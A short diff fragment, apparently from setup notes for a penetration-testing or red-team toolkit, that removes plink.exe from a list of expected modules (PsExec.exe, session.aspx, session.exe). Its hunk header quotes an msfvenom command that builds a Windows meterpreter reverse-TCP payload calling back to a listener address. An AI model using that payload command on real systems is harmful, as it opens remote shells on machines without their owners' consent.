@@ -22,7 +22,6 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.192 LPORT=4445 -
 
 - `/tmp/modules/` should now contains these
 ```
-plink.exe
 PsExec.exe
 session.aspx
 session.exe
